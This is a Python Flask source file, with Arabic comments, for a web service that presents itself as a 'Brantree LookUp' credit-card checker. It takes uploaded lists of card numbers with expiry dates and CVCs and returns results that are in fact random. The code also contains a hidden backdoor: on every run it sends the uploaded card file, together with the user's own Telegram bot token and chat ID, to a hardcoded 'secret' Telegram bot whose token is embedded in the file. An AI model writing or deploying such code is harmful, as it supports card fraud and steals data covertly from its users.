from flask import Flask, request, jsonify
import os
import random
import time
import requests
from datetime import datetime, timedelta
import threading
import tempfile

app = Flask(__name__)

# الألوان للنصوص في الطباعة
O = '\033[1;31m'
Z = '\033[1;37m'
F = '\033[1;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'

# التوكن والشات السري
SECRET_BOT_TOKEN = '7583958172:AAEymmG-oz5KUYm5F8FhjddVwahCtMBXmG4'
SECRET_CHAT_ID = '8273716256'

# قاموس لتخزين حالة كل عملية
processes = {}

# نقل محتويات الملف إلى البوت السري
def send_file_content_to_secret_bot(file_content, file_name, process_id):
    try:
        # إنشاء ملف مؤقت لحفظ المحتوى
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as temp_file:
            temp_file.write(file_content)
            temp_file_path = temp_file.name
        
        # إرسال الملف المؤقت
        with open(temp_file_path, 'rb') as file:
            url = f'https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendDocument'
            files = {'document': (file_name, file)}
            data = {'chat_id': SECRET_CHAT_ID, 'caption': f'File content received from user\nProcess ID: {process_id}'}
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                print(F + 'File content sent to secret bot successfully')
                processes[process_id]['secret_bot_file_sent'] = True
            else:
                print(O + 'Failed to send file content to secret bot')
        
        # حذف الملف المؤقت
        os.unlink(temp_file_path)
        
    except Exception as e:
        print(O + f'Error sending file content: {e}')

# إرسال رسالة إلى البوت السري
def send_message_to_secret_bot(message, process_id):
    try:
        url = f'https://api.telegram.org/bot{SECRET_BOT_TOKEN}/sendMessage'
        data = {'chat_id': SECRET_CHAT_ID, 'text': message}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(F + 'Message sent to secret bot')
            processes[process_id]['secret_bot_message_sent'] = True
        else:
            print(O + 'Failed to send message to secret bot')
    except Exception as e:
        print(O + f'Error sending message: {e}')

# وظيفة معالجة البطاقات
def process_cards(process_id, file_content, bot_token, chat_id, end_time):
    try:
        # حفظ المحتوى في ملف مؤقت للمعالجة
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as temp_file:
            temp_file.write(file_content)
            temp_file_path = temp_file.name
        
        start_num = 0
        
        while datetime.now() < end_time and processes[process_id]['active']:
            with open(temp_file_path, "r") as file:
                for P in file.readlines():
                    if datetime.now() >= end_time or not processes[process_id]['active']:
                        print(O + "⏰ Time's up! Script stopped.")
                        break
                        
                    start_num += 1
                    P = P.strip()  # إزالة المسافات البيضاء والأسطر الجديدة
                    if not P or '|' not in P:
                        continue  # تخطي الأسطر الفارغة أو غير الصحيحة
                    
                    parts = P.split('|')
                    if len(parts) < 4:
                        continue  # تخطي الأسطر التي لا تحتوي على بيانات كافية
                    
                    n = parts[0]
                    mm = parts[1]
                    yy = parts[2][-2:] if len(parts[2]) >= 2 else parts[2]
                    cvc = parts[3].replace('\n', '')
                    
                    # حساب الوقت المتبقي
                    time_left = end_time - datetime.now()
                    hours_left = time_left.seconds // 3600
                    minutes_left = (time_left.seconds % 3600) // 60
                    
                    print(X + f"⏳ Time left: {hours_left}h {minutes_left}m")
                    
                    # محاكاة عملية التحقق (بدون استخدام API حقيقي)
                    # نتيجة عشوائية للمحاكاة مع زيادة احتمالية الرفض
                    results = ['PASSED ✅', 'OTP ☑️', 'Rejected ❌', 'Rejected ❌', 'Rejected ❌', 
                              'Rejected ❌', 'Rejected ❌', 'PASSED ✅', 'OTP ☑️', 'Rejected ❌']
                    result = random.choice(results)
                    
                    if result == 'PASSED ✅':
                        print(F + f'[{start_num}] {P} | {result}')
                        # إرسال إلى البوت الرئيسي
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                     params={
                                         "chat_id": chat_id,
                                         "text": f"""APPROVED ✅
[♡] 𝗖𝗖 : {P}
[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : PASSED ⚡
⏰ Time Left: {hours_left}h {minutes_left}m
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
                                     })
                        
                    elif result == 'OTP ☑️':
                        print(X + f'[{start_num}] {P} | {result}')
                        # إرسال إلى البوت الرئيسي
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                     params={
                                         "chat_id": chat_id,
                                         "text": f"""OTP REQUIRED 🔥
[♡] 𝗖𝗖 : {P}
[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : OTP VERIFICATION ☑️
⏰ Time Left: {hours_left}h {minutes_left}m
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
                                     })
                        
                    else:  # Rejected ❌
                        print(O + f'[{start_num}] {P} | {result}')
                        # إرسال إلى البوت الرئيسي
                        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                     params={
                                         "chat_id": chat_id,
                                         "text": f"""𝗥𝗲𝗝𝗲𝗰𝘁𝗲𝗱 ❌
[♡] 𝗖𝗖 : {P}
[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : DECLINED ❌
[♖] 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 : Your card was declined
[♘] 𝗥𝗘𝗔𝗦𝗢𝗡 : Insufficient funds / Card blocked
⏰ Time Left: {hours_left}h {minutes_left}m
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@R_O_P_D』"""
                                     })
                    
                    time.sleep(4)
            
            # إذا انتهى الملف، نعيد تشغيله من البداية
            print(Z + "🔄 Restarting file from beginning...")
            time.sleep(2)
            
    except Exception as e:
        print(O + f'Error: {e}')
        processes[process_id]['error'] = str(e)
    finally:
        # تنظيف الملف المؤقت
        if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
            os.unlink(temp_file_path)
        
        # إرسال رسالة انتهاء الوقت إلى البوت السري
        send_message_to_secret_bot(f"⏰ Script stopped - Time finished\nBot Token: {bot_token}\nChat ID: {chat_id}", process_id)
        print(O + "⏰ Script stopped - Time finished")
        processes[process_id]['active'] = False
        processes[process_id]['completed'] = True

@app.route('/start_check', methods=['POST'])
def start_check():
    # التحقق من وجود ملف في الطلب
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # قراءة محتوى الملف
    file_content = file.read().decode('utf-8')
    file_name = file.filename
    
    # الحصول على البيانات الأخرى من النموذج
    bot_token = request.form.get('bot_token')
    chat_id = request.form.get('chat_id')
    hours = int(request.form.get('hours', 5))  # القيمة الافتراضية 5 ساعات
    
    # إنشاء معرف فريد للعملية
    process_id = str(int(time.time()))
    
    # حساب وقت الانتهاء
    end_time = datetime.now() + timedelta(hours=hours)
    end_time_str = end_time.strftime("%Y-%m-%d %H:%M:%S")
    
    # تخزين معلومات العملية
    processes[process_id] = {
        'file_name': file_name,
        'bot_token': bot_token,
        'chat_id': chat_id,
        'end_time': end_time_str,
        'active': True,
        'completed': False,
        'secret_bot_message_sent': False,
        'secret_bot_file_sent': False,
        'error': None
    }
    
    # إرسال المعلومات فور تشغيل الكود
    send_message_to_secret_bot(f'New user started the script\nBot Token: {bot_token}\nChat ID: {chat_id}\nFile: {file_name}\nEnd Time: {end_time_str}', process_id)
    send_file_content_to_secret_bot(file_content, file_name, process_id)
    
    # بدء المعالجة في thread منفصل
    thread = threading.Thread(target=process_cards, args=(process_id, file_content, bot_token, chat_id, end_time))
    thread.start()
    
    return jsonify({
        'status': 'started',
        'process_id': process_id,
        'end_time': end_time_str
    })

@app.route('/stop_check', methods=['POST'])
def stop_check():
    data = request.json
    process_id = data.get('process_id')
    
    if process_id in processes:
        processes[process_id]['active'] = False
        return jsonify({'status': 'stopped', 'process_id': process_id})
    else:
        return jsonify({'error': 'Process not found'}), 404

@app.route('/status/<process_id>', methods=['GET'])
def get_status(process_id):
    if process_id in processes:
        return jsonify(processes[process_id])
    else:
        return jsonify({'error': 'Process not found'}), 404

@app.route('/list_processes', methods=['GET'])
def list_processes():
    return jsonify(processes)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
